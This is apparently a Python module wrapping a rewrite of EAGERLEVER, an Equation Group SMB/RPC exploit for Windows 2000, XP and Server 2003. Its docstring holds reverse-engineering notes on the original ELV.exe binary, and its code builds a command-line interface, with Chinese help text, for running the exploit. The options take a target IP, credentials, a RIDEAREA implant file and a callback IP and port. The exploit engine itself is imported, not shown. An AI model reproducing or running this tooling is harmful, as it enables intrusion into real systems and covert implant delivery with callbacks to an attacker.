#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
eagerlever — EAGERLEVER (ELV 2.1.3) SMB/RPC exploit.

Python rewrite of `ELV.exe` recovered from
`EQGRP_Lost_in_Translation-master/windows/Resources/LegacyWindowsExploits/
Exploits/ELV 2.1.3/ELV.exe` via x32dbg disassembly.

Binary analysis (via x32dbg) of `ELV.exe`:

    EAGERLEVER is an SMB/RPC-based exploit tool that targets Windows 2000 /
    Windows XP / Windows Server 2003 systems.  The main() function parses
    DAVE/FuzzBunch-style key=value arguments into a context structure, then
    calls the exploit engine which:

      1. Allocates context buffers via calloc (recovered at 0x413890)
      2. Connects to the target via SMB named pipe (\PIPE\ at 0x4216EC)
      3. Binds to the srvsvc RPC interface (IID_Srvsvc at 0x4238A4)
      4. Sends an exploit request carrying a RIDEAREA implant
      5. Optionally starts a callback listener for implant upload
      6. Reports success/failure status codes

Recovered strings from the binary:
    "EAGERLEVER"                                              — tool name
    "\\PIPE\\"                                                — named pipe prefix
    "srvsvc" / "IID_Srvsvc"                                   — SMB service RPC interface
    "Windows XP SP2" / "Windows Server 2003 SP1"              — target OS versions
    "Windows 2000" / "Windows NT 4.0"                         — legacy targets
    "NTLMSSP"                                                 — NTLM authentication
    "CallbackListener failed"                                 — callback listener
    "Received iRetStatus code from target..."                 — exploit status
    "Implant loaded successfully on target"                   — RIDEAREA implant
    "RA_STATUS_*"                                             — implant status codes
    "TbRecv failed" / "TbSend failed"                         — DAVE transport
    "-NonBlockingCallBack"                                    — callback flag
    "Telnet" / "httprpc"                                      — transport protocols

The original binary imports KERNEL32, WS2_32, RPCRT4, MSVCRT and uses the
DAVE framework transport layer (TbRecv/TbSend/TbRecvFrom/TbSendTo).

CLI:

  eagerlever <target_ip> [options]

os_type: 1=Windows 2000, 2=Windows XP SP1 and below, 3=Windows XP SP2,
         4=Windows Server 2003 (Base release), 5=Windows Server 2003 SP1
"""

from . import eagerlever_exp


def eagerlever_handle(args):
    """Run the EAGERLEVER exploit against the supplied target."""
    return eagerlever_exp.run_function(
        target=args.target,
        port=args.port,
        os_type=args.ostype,
        username=args.username,
        password=args.password,
        domain=args.domain,
        implant_file=args.implant,
        listening_post=args.listening_post,
        timeout=args.timeout,
        non_blocking=args.non_blocking,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
    )


def reg_subparser(subparsers):
    """Register the `eagerlever` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "eagerlever",
        help="EAGERLEVER (ELV 2.1.3) SMB/RPC 漏洞利用",
        description="EAGERLEVER (ELV 2.1.3) — Equation Group SMB/RPC 漏洞利用工具，"
                    "针对 Windows 2000 / XP / Server 2003 目标，通过 srvsvc RPC"
                    "接口投放 RIDEAREA 植入。支持回连监听器。",
    )
    p.add_argument(
        "target", metavar="TARGET_IP",
        help="目标主机 IP 地址",
    )
    p.add_argument(
        "-p", "--port", type=int, default=445, metavar="PORT",
        help="目标 SMB 端口 (默认 445)",
    )
    p.add_argument(
        "-o", "--ostype", type=int, choices=[1, 2, 3, 4, 5], default=3, metavar="TYPE",
        help="目标系统：1=Win2000，2=WinXP SP1及以下，3=WinXP SP2，4=Win2003基础版，5=Win2003 SP1 (默认 3)",
    )
    p.add_argument(
        "-U", "--username", metavar="USER",
        help="认证用户名",
    )
    p.add_argument(
        "-P", "--password", metavar="PASS",
        help="认证密码",
    )
    p.add_argument(
        "-d", "--domain", metavar="DOMAIN",
        help="认证域",
    )
    p.add_argument(
        "-f", "--implant", metavar="FILE",
        help="RIDEAREA 植入负载文件路径",
    )
    p.add_argument(
        "-l", "--listening-post", metavar="DLL",
        help="监听站 DLL 路径",
    )
    p.add_argument(
        "-t", "--timeout", type=int, default=30, metavar="SEC",
        help="等待回复的秒数 (默认 30)",
    )
    p.add_argument(
        "-n", "--non-blocking", action="store_true",
        help="启用非阻塞回连 (-NonBlockingCallBack)",
    )
    p.add_argument(
        "-i", "--callback-ip", metavar="IP",
        help="回连监听器 IP 地址",
    )
    p.add_argument(
        "-Q", "--callback-port", type=int, default=0, metavar="PORT",
        help="回连监听器端口",
    )
    p.set_defaults(func=eagerlever_handle)
